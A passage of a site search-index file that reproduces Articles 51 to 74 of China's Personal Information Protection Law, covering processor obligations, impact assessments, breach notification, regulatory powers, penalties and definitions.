个人信息处理者应当根据个人信息的处理目的、处理方式、个人信息的种类以及对个人权益的影响、可能存在的安全风险等，采取下列措施确保个人信息处理活动符合法律、行政法规的规定，并防止未经授权的访问以及个人信息泄露、篡改、丢失：</p><p style="text-indent: 2em;">（一）制定内部管理制度和操作规程；</p><p style="text-indent: 2em;">（二）对个人信息实行分类管理；</p><p style="text-indent: 2em;">（三）采取相应的加密、去标识化等安全技术措施；</p><p style="text-indent: 2em;">（四）合理确定个人信息处理的操作权限，并定期对从业人员进行安全教育和培训；</p><p style="text-indent: 2em;">（五）制定并组织实施个人信息安全事件应急预案；</p><p style="text-indent: 2em;">（六）法律、行政法规规定的其他措施。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十二条</span>　处理个人信息达到国家网信部门规定数量的个人信息处理者应当指定个人信息保护负责人，负责对个人信息处理活动以及采取的保护措施等进行监督。</p><p style="text-indent: 2em;">个人信息处理者应当公开个人信息保护负责人的联系方式，并将个人信息保护负责人的姓名、联系方式等报送履行个人信息保护职责的部门。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十三条</span>　本法第三条第二款规定的中华人民共和国境外的个人信息处理者，应当在中华人民共和国境内设立专门机构或者指定代表，负责处理个人信息保护相关事务，并将有关机构的名称或者代表的姓名、联系方式等报送履行个人信息保护职责的部门。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十四条</span>　个人信息处理者应当定期对其处理个人信息遵守法律、行政法规的情况进行合规审计。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十五条</span>　有下列情形之一的，个人信息处理者应当事前进行个人信息保护影响评估，并对处理情况进行记录：</p><p style="text-indent: 2em;">（一）处理敏感个人信息；</p><p style="text-indent: 2em;">（二）利用个人信息进行自动化决策；</p><p style="text-indent: 2em;">（三）委托处理个人信息、向其他个人信息处理者提供个人信息、公开个人信息；</p><p style="text-indent: 2em;">（四）向境外提供个人信息；</p><p style="text-indent: 2em;">（五）其他对个人权益有重大影响的个人信息处理活动。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十六条</span>　个人信息保护影响评估应当包括下列内容：</p><p style="text-indent: 2em;">（一）个人信息的处理目的、处理方式等是否合法、正当、必要；</p><p style="text-indent: 2em;">（二）对个人权益的影响及安全风险；</p><p style="text-indent: 2em;">（三）所采取的保护措施是否合法、有效并与风险程度相适应。</p><p style="text-indent: 2em;">个人信息保护影响评估报告和处理情况记录应当至少保存三年。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十七条</span>　发生或者可能发生个人信息泄露、篡改、丢失的，个人信息处理者应当立即采取补救措施，并通知履行个人信息保护职责的部门和个人。通知应当包括下列事项：</p><p style="text-indent: 2em;">（一）发生或者可能发生个人信息泄露、篡改、丢失的信息种类、原因和可能造成的危害；</p><p style="text-indent: 2em;">（二）个人信息处理者采取的补救措施和个人可以采取的减轻危害的措施；</p><p style="text-indent: 2em;">（三）个人信息处理者的联系方式。</p><p style="text-indent: 2em;">个人信息处理者采取措施能够有效避免信息泄露、篡改、丢失造成危害的，个人信息处理者可以不通知个人；履行个人信息保护职责的部门认为可能造成危害的，有权要求个人信息处理者通知个人。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十八条</span>　提供重要互联网平台服务、用户数量巨大、业务类型复杂的个人信息处理者，应当履行下列义务：</p><p style="text-indent: 2em;">（一）按照国家规定建立健全个人信息保护合规制度体系，成立主要由外部成员组成的独立机构对个人信息保护情况进行监督；</p><p style="text-indent: 2em;">（二）遵循公开、公平、公正的原则，制定平台规则，明确平台内产品或者服务提供者处理个人信息的规范和保护个人信息的义务；</p><p style="text-indent: 2em;">（三）对严重违反法律、行政法规处理个人信息的平台内的产品或者服务提供者，停止提供服务；</p><p style="text-indent: 2em;">（四）定期发布个人信息保护社会责任报告，接受社会监督。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十九条</span>　接受委托处理个人信息的受托人，应当依照本法和有关法律、行政法规的规定，采取必要措施保障所处理的个人信息的安全，并协助个人信息处理者履行本法规定的义务。</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: 黑体;">第六章　履行个人信息保护职责的部门</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十条</span>　国家网信部门负责统筹协调个人信息保护工作和相关监督管理工作。国务院有关部门依照本法和有关法律、行政法规的规定，在各自职责范围内负责个人信息保护和监督管理工作。</p><p style="text-indent: 2em;">县级以上地方人民政府有关部门的个人信息保护和监督管理职责，按照国家有关规定确定。</p><p style="text-indent: 2em;">前两款规定的部门统称为履行个人信息保护职责的部门。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十一条</span>　履行个人信息保护职责的部门履行下列个人信息保护职责：</p><p style="text-indent: 2em;">（一）开展个人信息保护宣传教育，指导、监督个人信息处理者开展个人信息保护工作；</p><p style="text-indent: 2em;">（二）接受、处理与个人信息保护有关的投诉、举报；</p><p style="text-indent: 2em;">（三）组织对应用程序等个人信息保护情况进行测评，并公布测评结果；</p><p style="text-indent: 2em;">（四）调查、处理违法个人信息处理活动；</p><p style="text-indent: 2em;">（五）法律、行政法规规定的其他职责。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十二条</span>　国家网信部门统筹协调有关部门依据本法推进下列个人信息保护工作：</p><p style="text-indent: 2em;">（一）制定个人信息保护具体规则、标准；</p><p style="text-indent: 2em;">（二）针对小型个人信息处理者、处理敏感个人信息以及人脸识别、人工智能等新技术、新应用，制定专门的个人信息保护规则、标准；</p><p style="text-indent: 2em;">（三）支持研究开发和推广应用安全、方便的电子身份认证技术，推进网络身份认证公共服务建设；</p><p style="text-indent: 2em;">（四）推进个人信息保护社会化服务体系建设，支持有关机构开展个人信息保护评估、认证服务；</p><p style="text-indent: 2em;">（五）完善个人信息保护投诉、举报工作机制。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十三条</span>　履行个人信息保护职责的部门履行个人信息保护职责，可以采取下列措施：</p><p style="text-indent: 2em;">（一）询问有关当事人，调查与个人信息处理活动有关的情况;</p><p style="text-indent: 2em;">（二）查阅、复制当事人与个人信息处理活动有关的合同、记录、账簿以及其他有关资料;</p><p style="text-indent: 2em;">（三）实施现场检查，对涉嫌违法的个人信息处理活动进行调查;</p><p style="text-indent: 2em;">（四）检查与个人信息处理活动有关的设备、物品;对有证据证明是用于违法个人信息处理活动的设备、物品，向本部门主要负责人书面报告并经批准，可以查封或者扣押。</p><p style="text-indent: 2em;">履行个人信息保护职责的部门依法履行职责，当事人应当予以协助、配合，不得拒绝、阻挠。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十四条</span>　履行个人信息保护职责的部门在履行职责中，发现个人信息处理活动存在较大风险或者发生个人信息安全事件的，可以按照规定的权限和程序对该个人信息处理者的法定代表人或者主要负责人进行约谈，或者要求个人信息处理者委托专业机构对其个人信息处理活动进行合规审计。个人信息处理者应当按照要求采取措施，进行整改，消除隐患。</p><p style="text-indent: 2em;">履行个人信息保护职责的部门在履行职责中，发现违法处理个人信息涉嫌犯罪的，应当及时移送公安机关依法处理。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十五条</span>　任何组织、个人有权对违法个人信息处理活动向履行个人信息保护职责的部门进行投诉、举报。收到投诉、举报的部门应当依法及时处理，并将处理结果告知投诉、举报人。</p><p style="text-indent: 2em;">履行个人信息保护职责的部门应当公布接受投诉、举报的联系方式。</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: 黑体;">第七章　法律责任</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十六条</span>　违反本法规定处理个人信息，或者处理个人信息未履行本法规定的个人信息保护义务的，由履行个人信息保护职责的部门责令改正，给予警告，没收违法所得，对违法处理个人信息的应用程序，责令暂停或者终止提供服务；拒不改正的，并处一百万元以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p style="text-indent: 2em;">有前款规定的违法行为，情节严重的，由省级以上履行个人信息保护职责的部门责令改正，没收违法所得，并处五千万元以下或者上一年度营业额百分之五以下罚款，并可以责令暂停相关业务或者停业整顿、通报有关主管部门吊销相关业务许可或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处十万元以上一百万元以下罚款，并可以决定禁止其在一定期限内担任相关企业的董事、监事、高级管理人员和个人信息保护负责人。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十七条</span>　有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十八条</span>　国家机关不履行本法规定的个人信息保护义务的，由其上级机关或者履行个人信息保护职责的部门责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p style="text-indent: 2em;">履行个人信息保护职责的部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六十九条</span>　处理个人信息侵害个人信息权益造成损害，个人信息处理者不能证明自己没有过错的，应当承担损害赔偿等侵权责任。</p><p style="text-indent: 2em;">前款规定的损害赔偿责任按照个人因此受到的损失或者个人信息处理者因此获得的利益确定;个人因此受到的损失和个人信息处理者因此获得的利益难以确定的，根据实际情况确定赔偿数额。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第七十条</span>　个人信息处理者违反本法规定处理个人信息，侵害众多个人的权益的，人民检察院、法律规定的消费者组织和由国家网信部门确定的组织可以依法向人民法院提起诉讼。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第七十一条</span>　违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: 黑体;">第八章　附　　则</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第七十二条</span>　自然人因个人或者家庭事务处理个人信息的，不适用本法。</p><p style="text-indent: 2em;">法律对各级人民政府及其有关部门组织实施的统计、档案管理活动中的个人信息处理有规定的，适用其规定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第七十三条</span>　本法下列用语的含义：</p><p style="text-indent: 2em;">（一）个人信息处理者，是指在个人信息处理活动中自主决定处理目的、处理方式的组织、个人。</p><p style="text-indent: 2em;">（二）自动化决策，是指通过计算机程序自动分析、评估个人的行为习惯、兴趣爱好或者经济、健康、信用状况等，并进行决策的活动。</p><p style="text-indent: 2em;">（三）去标识化，是指个人信息经过处理，使其在不借助额外信息的情况下无法识别特定自然人的过程。</p><p style="text-indent: 2em;">（四）匿名化，是指个人信息经过处理无法识别特定自然人且不能复原的过程。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第七十四条</span>　本法自2021年11月1日起施行。</p><p><strong>原文链接：<a href="http://www.npc.gov.cn/npc/c30834/202108/a8c4e3672c74491a80b53a172bb753fe.shtml">http://www.npc.gov.cn/npc/c30834/202108/a8c4e3672c74491a80b53a172bb753fe.shtml</a></strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="tags/index.html"/>
      <url>tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
